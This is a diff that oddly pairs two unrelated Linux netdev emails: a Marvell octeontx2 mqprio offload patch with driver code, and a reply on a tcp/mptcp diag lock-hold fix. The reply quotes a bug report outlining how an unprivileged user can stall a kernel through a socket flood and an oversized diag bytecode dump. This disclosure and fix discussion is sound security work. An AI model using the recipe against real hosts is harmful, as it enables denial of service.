@@ -1,1243 +1,1136 @@
-Received: from mx0b-0016f401.pphosted.com (mx0b-0016f401.pphosted.com [67.231.156.173])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-lf1-f53.google.com (mail-lf1-f53.google.com [209.85.167.53])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F3B1528D8D0;
-	Thu,  3 Sep 2026 02:34:13 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=67.231.156.173
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788402856; cv=none; b=Z/QC2GptsnWXcLF8OX331iy5kTeS7gcswtOJ0Xq1fRFPbYOF27ZWQIO0MaUgCXhieBPvIUedMmdKnE9o+N+z9hP/YRJLAsVz1T9nxga7qwprFYqJ+6Drug17qji2qMXANzGuT1bity3QrZhD372tjuTUUEC0MWr4TZxPp+ACYuc=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788402856; c=relaxed/simple;
-	bh=TRe3MfDqKrhZ8jeT25YzTtVWqyVAaZDfX69VFOxrYTo=;
-	h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Type; b=KYQnnJei5Rtu6ImFFb0ynY2Cqww1FQDgxQ6mtKkxzZnA0bNetcK0AbQSlYlBZ/lAEHe2LT1hAe6wmaf6GNj4H/VA3qbw4I+2lxAf8lxQmYDjI9FcmZ3zV8SdGRqmBmNXnP5NL4hw2f+IyCqTahEf1tF/PFm9bOZhMtB7KpGWL80=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=marvell.com; spf=pass smtp.mailfrom=marvell.com; dkim=pass (2048-bit key) header.d=marvell.com header.i=@marvell.com header.b=BWJjYBmQ; arc=none smtp.client-ip=67.231.156.173
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=marvell.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=marvell.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4365836F434
+	for <netdev@vger.kernel.org>; Thu,  3 Sep 2026 02:35:14 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.167.53
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1788402923; cv=pass; b=iegcDGnIRklMD4bJDczGsJU4EzqTuj9oeRs/a6iSMhXS/6y+rUNEyzIf+esPPn2dWTdGeLGUPkTodLGYDoENGudhdF39DjWi3+cDy9jU9zhiCIESLgMrCeFL9WVcozx+BihRx7Ov+J1jravObUbOzahoOR0nLcJYSrC4aRcfskM=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1788402923; c=relaxed/simple;
+	bh=zDTf/eIsUKIEnjwbF5JRwrHOX6J9/jFWI4Y8R1lZ7jM=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=qEegPR5i4mSfxxlPtfaEvM8SHQvl8oKCFx2bykuHkWycUPbhMV6EoQsVpHTdkBFPYT7m3oY/4pKJGwz11TWUl9QDZHywPni1xoHdLUi3EphSm2xmx+d2hu3c2VXDkTAP9J4N6NlNCSVie3YpzoKk0095PXBhim7gjLS4zBiOcsU=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=PB+Cy0Nv; arc=pass smtp.client-ip=209.85.167.53
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=marvell.com header.i=@marvell.com header.b="BWJjYBmQ"
-Received: from pps.filterd (m0431383.ppops.net [127.0.0.1])
-	by mx0b-0016f401.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 682NKQ0b2930202;
-	Wed, 2 Sep 2026 19:33:41 -0700
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=marvell.com; h=
-	cc:content-transfer-encoding:content-type:date:from:message-id
-	:mime-version:subject:to; s=pfpt0220; bh=S/h10SGOjp3X6pIH0BISM92
-	ALY5iNC2pFaptM2Iz/gk=; b=BWJjYBmQ8DLOnvnDHhZwnfoK18AHKAk4iwV58ik
-	KYr2yYvtqSh5x57K9lCaQQb611E2WT1DnabBlNJ3jQXICQiL8qM9T93H4B8idIdp
-	TW7Lvjcu1MA4AWcgR2RnyPbYJPyIaoxj6f4fUCRMSfqz3Ah9tJ4J3AMGNktzFxxT
-	52YWGhHsqkbsTaZIVtU5mbnP7IdtYqdWs9xL/RZXb5EQ3Vgu8uh1Np/8F1RRns6y
-	/hHicaXGXl+CLnxBqw1pVc3q/LAUKv9q/v5JgfvSf1gD41OPv0k2CixhEr5Q6Y9L
-	gvYGIF/3ByUcFUaXoGjyM7sNKfnoTRFXZAkOpBHUVdjz7hw==
-Received: from dc5-exch05.marvell.com ([199.233.59.128])
-	by mx0b-0016f401.pphosted.com (PPS) with ESMTPS id 4gef5b3579-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Wed, 02 Sep 2026 19:33:41 -0700 (PDT)
-Received: from DC5-EXCH05.marvell.com (10.69.176.209) by
- DC5-EXCH05.marvell.com (10.69.176.209) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.1544.25; Wed, 2 Sep 2026 19:33:40 -0700
-Received: from maili.marvell.com (10.69.176.80) by DC5-EXCH05.marvell.com
- (10.69.176.209) with Microsoft SMTP Server id 15.2.1544.25 via Frontend
- Transport; Wed, 2 Sep 2026 19:33:40 -0700
-Received: from rkannoth-OptiPlex-7090.. (unknown [10.28.36.165])
-	by maili.marvell.com (Postfix) with ESMTP id 60B263F7072;
-	Wed,  2 Sep 2026 19:33:35 -0700 (PDT)
-From: Ratheesh Kannoth <rkannoth@marvell.com>
-To: <bpf@vger.kernel.org>, <linux-kernel@vger.kernel.org>,
-        <netdev@vger.kernel.org>
-CC: <andrew+netdev@lunn.ch>, <ast@kernel.org>, <daniel@iogearbox.net>,
-        <davem@davemloft.net>, <edumazet@google.com>, <hawk@kernel.org>,
-        <john.fastabend@gmail.com>, <kuba@kernel.org>, <pabeni@redhat.com>,
-        <sdf@fomichev.me>, <sgoutham@marvell.com>,
-        Ratheesh Kannoth
-	<rkannoth@marvell.com>
-Subject: [PATCH v12 net-next] octeontx2-pf: add mqprio bandwidth offload for NIX TX schedulers
-Date: Thu, 3 Sep 2026 08:03:24 +0530
-Message-ID: <20260903023324.3078284-1-rkannoth@marvell.com>
-X-Mailer: git-send-email 2.43.0
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="PB+Cy0Nv"
+Received: by mail-lf1-f53.google.com with SMTP id 2adb3069b0e04-5b4ae3e201cso1804606e87.2
+        for <netdev@vger.kernel.org>; Wed, 02 Sep 2026 19:35:14 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1788402912; cv=none;
+        d=google.com; s=arc-20260327;
+        b=gsPWChrd5mo2G+fJ6MsP+awmDQ4KWCx2xDGeClYkgXYYspgKpbdNyubXb72TQ/+Ufv
+         qHarbS9IA1/xMLFQ4nrd4XlliyALukP8ZqN3pbGaJJeU0bfzknxMnfX0mVRD9Ln/HwZp
+         h17KNdEnmJar6kFYoLXTkxju2f4a7gv8ik98QodQnXMUwfDl4Xih1U4+FRnmipyJ3LVp
+         GHsXzCxOYtajjgv7DDvD+noqHb5DbGX/iGABNR+ok7lPLoPz5w1nWxVcl5KJQp7MXJIC
+         ct4VL8sEuMDkNulBi4BxVKyRw1xeTww56svidE2BVrutVIkKhX2iYOXXkDbi/L/b8ZUR
+         NLKg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=pAreqm4ZAwmAMcKTnPWqfeMzfD8bNnBFNnhJTT0SQM0=;
+        fh=FsS1e2T4ZzW6PiKE9LaNMHIMFP18qE0PnSEFfmpvVzk=;
+        b=LB4seK6H7WyDkXN67bSwppSFJQqLaUCNwcLO3Wg2UXX1HMFl6ABAxBT4IS+t4dp8Sa
+         bpkpuEmbAOgdeUmH901B8Xs/uxjHl/WMyIsSb2ecMKjIXJEY+DlBqpuDBpV26YKSJeel
+         lw1UFhNEtnHEjIOoS0ERV0Ptzxq/u4KleGFHMf4WrJ8TWVq75ojg/dekim571cqAcVUc
+         z/XSRx4GcFQy3YUEu3S7aWiSQA3kirQIuKTLpLXOJvQWJVkpzrtZEvqKJJQuQplZrhYA
+         StSnKNk3Qqj41sgoWUanvciDJAW1EqsyBz1y/mueUDTPHSTK8gt04nuyuA3dN+NJKTik
+         NrEA==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788402912; x=1789007712; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=pAreqm4ZAwmAMcKTnPWqfeMzfD8bNnBFNnhJTT0SQM0=;
+        b=PB+Cy0NvMHMcU5SJJZ1AdEh+tN38lABZf7QmGSyR4mHW+r3Lcgy4QIl47cJAEcjbA2
+         Ny+GB32ZyuSQ5cLhEPzOXmTSMDT96+8jUeRKmBx5hdIs9PhMM3EZzlS835pZqlMAhb36
+         /c8Z1ztstCLRhYu9vix9Ytf00S0gWc80ZOvfgsqabwhSgqu0k1mmRztvkmyrlEtalTDt
+         8YDkaUQWVQwRg+j/QIGNnJbq7Z+KXz4/JFT1Y0PcfWnZZZHJkseHu6Aos/424Uxa+uWk
+         B/aBwIXKn+PW2AY0OX5TfkQXfS+n7E7f3gHZZ2t3Voiwew+KS5aKYisVkFbiQ3oZiHXj
+         qcDg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788402912; x=1789007712;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=pAreqm4ZAwmAMcKTnPWqfeMzfD8bNnBFNnhJTT0SQM0=;
+        b=piwsRQ6jzj7tcfBMHA217YeN9WIZWIMQ6NV+kWjfwKuoMOwQOP4GKYJDGTRiaRFHqn
+         qaLC3U55qR0VL3ICHPRDbeuPlQCKqE8HD4ZzGQBLJQgyIvmEn4kQxFqN7JkfEIO1BCKM
+         mBRKhV/G+eHxmv0fUa65GwZvzJniTj+RO+tdHz2tFlJoG7L86+q4l+H0jD73PhSIDzl5
+         3eSm0PJqBrpcWmJW00u8KMIDohXWT2OpryuCnw4iuNX05IBzMsFokOKhR1vpzHSWQGCf
+         TL/a90e3Jq8sMHZQQk6yW+J2Ck8hCikr1zFEsJgdUlO9AWBMS3RZrqkHhF0j7eOkD0GE
+         UTbQ==
+X-Gm-Message-State: AFuF++ltRvbrruWQzakG3Y+7WTKf/X2/y8UzVfCIrkWouQGRXy3w8Awb
+	uMLVZAO0ELTi7L0/WHK/HlR03p66PQYaoejm8C2hPTMCm3pvDLRCY6KW+Mu/Nd7hifO1FMravfq
+	aVvUD6bimwy/C646vG/fUron+IVfVeireZiPwCQpBHBc=
+X-Gm-Gg: AYBFou3ADIYToi+OMZVETaiPc+3OCChdQA+tSUbmL0jljAH5Vc7S7UT6C11YweONK6q
+	4QdiwDqtOclKTU3djCwpklk9cYmx3q9s39Y/eaamqoV0WZoRavVWtm5tqo+ywakQywr2qm9SZEM
+	8cITwwYS56rdzEsN3t2gR4+ExQPb6xFz66ld/wFpur+0uZ6V9sZgHrfP4sykmxJgbmClLCYbx5i
+	obi0+ybsZMYSnykMGL5CwIjnM4ONuoeMDBm5468cZck4cMWG4jSzc/v7tCgk35j1R4Ta6MwYmnK
+	pw+k7tneqyhERpcIVZqHzgoUKBx7lvOFVrYXVPOqi1jcejktKRV2xMZD6xUHWi6Mh9Ab5m7e0HF
+	w5Q==
+X-Received: by 2002:a05:6512:2c8b:b0:5b5:a8ab:3500 with SMTP id
+ 2adb3069b0e04-5b609196955mr2620824e87.2.1788402911739; Wed, 02 Sep 2026
+ 19:35:11 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-Content-Type: text/plain
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwOTAzMDAyMSBTYWx0ZWRfX157cmox8SnQv
- 7KSyipHujmouNkDLsHvcl3dxPya8Um0gxBfRTctUo6aekP25asQA5YFhozIVyfsaZZ4GmxAPJS1
- R8W9nU/OPl9p+q7uLdhG2oYQttee1LMyktfuzJ6UyoNu1l/BZgPq9yU6f2lAaZ8h1n22tTu+VoM
- gI+YmXqX9aQT3W+lrAScoDOrf4YlWLU32egz5Flz51qpijCfG0fkhUfdi0+nl3VS/DVkZJCFmbW
- GX2Eb4m0jNXJaGJYiPft9W1nqvj7hmqrLbAiHEsFRB0uuX7qiVKckAYUPDbM9W/LOuFWjRZWK1Y
- PmD9/fucK2R8DWeFxmLCtNCHol8+FhqaU9NjOSj0GAGqS5q43rSxP9Zu7oapKHiipvKhhrHgss8
- 0vV0dLxgkdwvBi6rjJXg7tfe5Y17v/DwNVEPmAPXEo3MOg+7UT4n5m4hmIJrui9yZMcbNXxS/HL
- ax04pNZIj0ag3mcAAcQ==
-X-Proofpoint-GUID: 49o641Dn_P4nXO6vbWTpk8dSbr01Dsfr
-X-Authority-Analysis: v=2.4 cv=e6Y2j6p/ c=1 sm=1 tr=0 ts=6a98dc85 cx=c_pps
- a=rEv8fa4AjpPjGxpoe8rlIQ==:117 a=rEv8fa4AjpPjGxpoe8rlIQ==:17
- a=VdqzKS8jKosA:10 a=VkNPw1HP01LnGYTKEx00:22 a=l0iWHRpgs5sLHlkKQ1IR:22
- a=qit2iCtTFQkLgVSMPQTB:22 a=c92rfblmAAAA:8 a=M5GUcnROAAAA:8 a=VwQbUJbxAAAA:8
- a=aT57TloUlbeadIoK0kMA:9 a=GvGzcOZaWPEFPQC_NcjD:22 a=OBjm3rFKGHvpk9ecZwUJ:22
-X-Proofpoint-ORIG-GUID: 49o641Dn_P4nXO6vbWTpk8dSbr01Dsfr
-X-Proofpoint-Spam-Info: AW1haW4tMjYwOTAzMDAyMSBTYWx0ZWRfX/DMTcwQuvOPN
- MyZntIpqscniRKlAJ8D3RUtrSmdk6s+saMeYDhIDuf7GayrlncPx5x6HISxLV8ThOklujvubLlY
- WQome2CE9xj+2IvrBXAAXQWs9gqALUc=
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1176,Hydra:6.1.134,FMLib:17.12.100.49
- definitions=2026-09-02_06,2026-09-02_04,2025-10-01_01
+References: <cover.1788248601.git.zihanx@nebusec.ai> <CAAVpQUDMSKo6S5CADED41XMxvxBVWpQfcNbvebGWc4hg6mROHw@mail.gmail.com>
+In-Reply-To: <CAAVpQUDMSKo6S5CADED41XMxvxBVWpQfcNbvebGWc4hg6mROHw@mail.gmail.com>
+From: zihan xi <zihanx@nebusec.ai>
+Date: Thu, 3 Sep 2026 10:35:00 +0800
+X-Gm-Features: AcwNN1XsbqYhFH109uPXn6TL0cz3vpOOB4kP2JbFDNNGe51ax4Ni-WcS_nMyopc
+Message-ID: <CAANe3eTr9kM-Vso_n1TcAGq7+5VJ5Mx9N7-Oyh7KdJXyLfDHGw@mail.gmail.com>
+Subject: Re: [PATCH net v2 0/2] tcp: diag: bound bucket lock hold in diag dump paths
+To: Kuniyuki Iwashima <kuniyu@google.com>
+Cc: netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
+	mptcp@lists.linux.dev, "David S . Miller" <davem@davemloft.net>, 
+	Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
+	Simon Horman <horms@kernel.org>, Neal Cardwell <ncardwell@google.com>, 
+	Matthieu Baerts <matttbe@kernel.org>, Mat Martineau <martineau@kernel.org>, 
+	Geliang Tang <geliang@kernel.org>, Guillaume Nault <gnault@redhat.com>, Florian Westphal <fw@strlen.de>
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-Add TC_SETUP_QDISC_MQPRIO offload for channel-mode mqprio with
-TC_MQPRIO_SHAPER_BW_RATE. Program per-queue MDQ CIR/PIR through the
-NIX TX scheduler mailbox for each non-QoS transmit queue. When offload
-is active, allocate one SMQ per such queue, parent every MDQ under
-TL4[0], and map each traffic class min/max rate to the queue(s) in that
-class.
-
-Rebuild the TX scheduler hierarchy by bouncing the netdev through
-ndo_stop() and ndo_open() on mqprio add, replace, and delete. Cache
-the active rates and restore MDQ shapers from otx2_mqprio_up() during
-ndo_open(); log and continue if restoration fails so a normal open is
-not blocked.
-
-Track mqprio configuration in mq_offload_snap snapshots (TC layout and
-rates). On tc qdisc replace, stage the new configuration while keeping
-the previous snapshot for rollback: failed setup restores the old
-snapshot, successful graft is recorded through TC_ROOT_GRAFT, and
-teardown of the replaced qdisc instance commits the staged snapshot
-without tearing down the live offload.
-
-Reject offload unless the interface is running and the device advertises
-CIR+PIR support. Reject per-TC rates for traffic classes mapped to more
-than one queue, SDP rep ports, and concurrent PFC or XDP use. Block
-ethtool channel count changes while mqprio bandwidth offload is active.
-
-Add a ratelimited AF debug message when validating TX scheduler queue
-ownership to aid mqprio hierarchy setup failures.
-
-Signed-off-by: Ratheesh Kannoth <rkannoth@marvell.com>
-
----
-
-v11 -> v12: Addressed sashiko comments.
-	https://sashiko.dev/#/patchset/20260902015500.2985371-1-rkannoth%40marvell.com
-v10 -> v11: Addressed sashiko comments.
-	https://sashiko.dev/#/patchset/20260831131014.2639581-1-rkannoth%40marvell.com
-
-v9 -> v10: Addressed sashiko/jacub comments.
-	https://sashiko.dev/#/message/20260817032747.1765883-1-rkannoth%40marvell.com
-
-v8 -> v9: Addressed Sashiko comments
-	https://lore.kernel.org/netdev/aoJ6FhtWue0FHDQV@rkannoth-OptiPlex-7090/
-v7 -> v8: Addressed Sashiko comments
-	https://sashiko.dev/#/patchset/20260811085050.3212280-1-rkannoth%40marvell.com
-v6 -> v7: Addressed Sashiko comments
-	https://sashiko.dev/#/message/20260810034738.1786029-1-rkannoth%40marvell.com
-v5 -> v6: Addressed Sashiko comments
-	https://lore.kernel.org/netdev/20260806095434.1144397-1-rkannoth@marvell.com/
-v4 -> v5: Addressed sashiko comments
-	https://sashiko.dev/#/patchset/20260803042724.3380209-1-rkannoth%40marvell.com
-v3 -> v4: Addressed sashiko comments
-	https://lore.kernel.org/netdev/20260729105139.2302908-1-rkannoth@marvell.com/
-v2 -> v3: Addressed sashiko comments
-	https://lore.kernel.org/netdev/amnYX866mYx02cBe@rkannoth-OptiPlex-7090/T/#m67310cbec48b21c7720858ab3a1ea083a0f8dc10
-v1 -> v2: Addressed sashiko comments
-	https://lore.kernel.org/netdev/20260724075010.2665758-1-rkannoth@marvell.com/
----
- .../ethernet/marvell/octeontx2/af/rvu_nix.c   |   6 +-
- .../marvell/octeontx2/nic/otx2_common.c       | 146 +++-
- .../marvell/octeontx2/nic/otx2_common.h       |  27 +
- .../marvell/octeontx2/nic/otx2_dcbnl.c        |   6 +
- .../marvell/octeontx2/nic/otx2_ethtool.c      |   8 +
- .../ethernet/marvell/octeontx2/nic/otx2_pf.c  |  12 +
- .../ethernet/marvell/octeontx2/nic/otx2_tc.c  | 705 ++++++++++++++++++
- .../net/ethernet/marvell/octeontx2/nic/qos.c  |   3 +
- 8 files changed, 911 insertions(+), 2 deletions(-)
-
-diff --git a/drivers/net/ethernet/marvell/octeontx2/af/rvu_nix.c b/drivers/net/ethernet/marvell/octeontx2/af/rvu_nix.c
-index 153eb57bad06..c9a4326d725d 100644
---- a/drivers/net/ethernet/marvell/octeontx2/af/rvu_nix.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/af/rvu_nix.c
-@@ -331,8 +331,12 @@ static bool is_valid_txschq(struct rvu *rvu, int blkaddr,
- 			return true;
- 	}
- 
--	if (map_func != pcifunc)
-+	if (map_func != pcifunc) {
-+		dev_err_ratelimited(rvu->dev,
-+				    "pcifunc %x map pcifunc %x not equal, lvl=%u schq=%u\n",
-+				    pcifunc, map_func, lvl, schq);
- 		return false;
-+	}
- 
- 	return true;
- }
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.c b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.c
-index 175992188c18..a519e0a97a2b 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.c
-@@ -615,6 +615,142 @@ void otx2_get_mac_from_af(struct net_device *netdev)
- }
- EXPORT_SYMBOL(otx2_get_mac_from_af);
- 
-+static int
-+otx2_nix_tmq_reg_write(struct otx2_nic *pfvf, int cnt,
-+		       u64 reg_addr[MAX_REGS_PER_MBOX_MSG],
-+		       u64 reg_val[MAX_REGS_PER_MBOX_MSG])
-+{
-+	struct mbox *mbox = &pfvf->mbox;
-+	struct nix_txschq_config *req;
-+	int i, err;
-+
-+	mutex_lock(&mbox->lock);
-+	req = otx2_mbox_alloc_msg_nix_txschq_cfg(mbox);
-+	if (!req) {
-+		mutex_unlock(&mbox->lock);
-+		return -ENOMEM;
-+	}
-+
-+	req->lvl = NIX_TXSCH_LVL_MDQ;
-+	req->num_regs = cnt;
-+
-+	for (i = 0; i < cnt; i++) {
-+		req->reg[i] = reg_addr[i];
-+		req->regval[i] = reg_val[i];
-+	}
-+
-+	err = otx2_sync_mbox_msg(mbox);
-+	mutex_unlock(&mbox->lock);
-+
-+	return err;
-+}
-+
-+int otx2_nix_tm_clear_queue_shaper(struct otx2_nic *pfvf)
-+{
-+	u64 reg_addr[MAX_REGS_PER_MBOX_MSG];
-+	u64 reg_val[MAX_REGS_PER_MBOX_MSG];
-+	int err, smq, i, cnt = 0;
-+
-+	for (i = 0; i < pfvf->hw.txschq_cnt[NIX_TXSCH_LVL_SMQ]; i++) {
-+		smq = pfvf->hw.txschq_list[NIX_TXSCH_LVL_SMQ][i];
-+
-+		reg_addr[cnt] = NIX_AF_MDQX_PIR(smq);
-+		reg_val[cnt] = 0;
-+		cnt++;
-+
-+		reg_addr[cnt] = NIX_AF_MDQX_CIR(smq);
-+		reg_val[cnt] = 0;
-+		cnt++;
-+
-+		if (cnt < MAX_REGS_PER_MBOX_MSG - 1)
-+			continue;
-+
-+		err = otx2_nix_tmq_reg_write(pfvf, cnt,
-+					     reg_addr, reg_val);
-+		if (err)
-+			goto fail;
-+		cnt = 0;
-+	}
-+
-+	if (cnt) {
-+		err = otx2_nix_tmq_reg_write(pfvf, cnt,
-+					     reg_addr, reg_val);
-+		if (err)
-+			goto fail;
-+	}
-+
-+	return 0;
-+fail:
-+	return err;
-+}
-+
-+int otx2_nix_tm_set_queue_shaper(struct otx2_nic *pfvf,
-+				 int txq, u64 minrate, u64 maxrate)
-+{
-+	struct mbox *mbox = &pfvf->mbox;
-+	struct nix_txschq_config *req;
-+	int err, smq, n = 0;
-+	u64 reg_addr[2];
-+	u64 reg_val[2];
-+	u64 rate;
-+
-+	if (!maxrate && !minrate) {
-+		smq = otx2_get_smq_idx(pfvf, txq);
-+		reg_addr[0] = NIX_AF_MDQX_PIR(smq);
-+		reg_val[0] = 0;
-+		reg_addr[1] = NIX_AF_MDQX_CIR(smq);
-+		reg_val[1] = 0;
-+		return otx2_nix_tmq_reg_write(pfvf, 2, reg_addr, reg_val);
-+	}
-+
-+	smq = otx2_get_smq_idx(pfvf, txq);
-+
-+	mutex_lock(&mbox->lock);
-+	req = otx2_mbox_alloc_msg_nix_txschq_cfg(mbox);
-+	if (!req) {
-+		mutex_unlock(&mbox->lock);
-+		return -ENOMEM;
-+	}
-+
-+	req->lvl = NIX_TXSCH_LVL_MDQ;
-+
-+	/* MQPRIO exposes only min/max rate, not burst.  Pass burst 0 so
-+	 * otx2_get_egress_burst_cfg() programmes the largest burst the NIX
-+	 * encoding supports (CN10K_MAX_BURST_SIZE on CN10K).  This differs
-+	 * from the 65536 byte default used in the HTB path, which is a
-+	 * kernel-side default when no explicit burst is configured, not a
-+	 * hardware cap.
-+	 *
-+	 * mqprio setup restarts the netdev (otx2_mqprio_restart_netdev),
-+	 * which resets MDQ shapers to zero.  Program both PIR and CIR on
-+	 * every update so omitted rates are applied explicitly rather than
-+	 * relying on stale hardware state.
-+	 */
-+	req->reg[n] = NIX_AF_MDQX_PIR(smq);
-+	if (maxrate) {
-+		rate = otx2_convert_rate(maxrate);
-+		req->regval[n] = otx2_get_txschq_rate_regval(pfvf, rate, 0);
-+	} else {
-+		req->regval[n] = 0;
-+	}
-+	n++;
-+
-+	/* CIR+PIR support is required and checked at mqprio setup. */
-+	req->reg[n] = NIX_AF_MDQX_CIR(smq);
-+	if (minrate) {
-+		rate = otx2_convert_rate(minrate);
-+		req->regval[n] = otx2_get_txschq_rate_regval(pfvf, rate, 0);
-+	} else {
-+		req->regval[n] = 0;
-+	}
-+	n++;
-+	req->num_regs = n;
-+
-+	err = otx2_sync_mbox_msg(mbox);
-+	mutex_unlock(&mbox->lock);
-+	return err;
-+}
-+
- int otx2_txschq_config(struct otx2_nic *pfvf, int lvl, int prio, bool txschq_for_pfc)
+On Thu, Sep 3, 2026 at 10:09=E2=80=AFAM Kuniyuki Iwashima <kuniyu@google.co=
+m> wrote:
+>
+> On Tue, Sep 1, 2026 at 5:53=E2=80=AFAM Zihan Xi <zihanx@nebusec.ai> wrote=
+:
+> >
+> > Hi Linux kernel maintainers,
+> >
+> > We found and validated an issue in net/ipv4/tcp_diag.c and
+> > net/mptcp/mptcp_diag.c. The bug is reachable by a
+> > non-root user via user and net namespace.
+> > Our testing did not identify any impact on other functionality.
+> >
+> > We will provide detailed information about the bug
+> > in this email, along with a PoC to trigger it.
+> >
+> > ---- details below ----
+> >
+> > Bug details:
+> >
+> > inet_diag TCP dumps currently execute request-supplied
+> > INET_DIAG_REQ_BYTECODE programs while still holding the listener, bind,
+> > or ehash bucket locks in tcp_diag_dump(). With a heavily populated
+> > bucket, the time spent under the same lock grows with both raw socket
+> > traversal and bytecode cost.
+> >
+> > The local listener reproducer creates four SO_REUSEPORT groups of 32768
+> > listeners each, 131072 sockets in total, and then issues a
+> > NETLINK_SOCK_DIAG dump request with 16380 INET_DIAG_BC_NOP instructions
+>
+> Same feedback as v1.
+>
+> tcp_diag_dump() is long enough, and I don't think that the "fix"
+> to avoid a long loop on *QEMU* due to an unreal setup is worth
+> 300 LoC(hurn).
+>
+>
+>
+>
+> > followed by a failing INET_DIAG_BC_D_EQ test. This is a deliberately
+> > concentrated setup to make the lock scope observable; it is not intende=
+d
+> > to represent a typical deployment. Because every socket runs the full
+> > bytecode and none reaches the reply fill path, skb backpressure does no=
+t
+> > terminate the walk early.
+> > On the unfixed kernel, with local softlockup panic sysctls enabled, thi=
+s
+> > makes the long bucket-locked section visible as a watchdog report and
+> > panic in inet_diag_bc_sk().
+> >
+> > The earlier batching fix direction was still too narrow: it only counte=
+d
+> > sockets that survived the cheap prefilters and reached the expensive du=
+mp
+> > path. An attacker can therefore populate one bucket with many sockets o=
+r
+> > listeners that fail the netns/family/port or MPTCP-specific prefilters,
+> > causing the same bucket lock to be scanned far past the 16-entry batch
+> > threshold before control is returned.
+> >
+> > The same root cause also exists in MPTCP listener dumping. The
+> > MPTCP-specific mptcp_diag_dump_listeners() path reuses sk_diag_dump(),
+> > which runs inet_diag_bc_sk() before filling the netlink reply, while th=
+e
+> > listener bucket lock is still held.
+> >
+> > The inline reproducer and decoded crash log below cover the TCP watchdo=
+g
+> > path only. They are not an MPTCP crash reproduction. The crash log is t=
+he
+> > decoded output of `./scripts/decode_stacktrace.sh`, with source paths
+> > reduced to repository-relative file and line references for review. The
+> > MPTCP patch addresses the equivalent listener lock scope identified by
+> > code inspection and completed MPTCP listener stress tests. A separate
+> > MPTCP crash artifact is not included, because the fixed MPTCP run
+> > completed without a crash.
+> >
+> > This series fixes both sites by keeping bucket-locked sections limited =
+to
+> > raw socket collection and lifetime pinning, and moving all filtering,
+> > inet_diag_bc_sk(), and socket filling work out of the locked regions so
+> > the batch limit applies to raw bucket traversal itself. For TCP listene=
+r,
+> > bind, and ehash buckets, and for the MPTCP listener bucket, restarts no=
+w
+> > keep a referenced dump cursor so the next batch resumes after the
+> > previous socket instead of rescanning the bucket head under the same
+> > lock. A stored cursor is reused only after it is checked against the
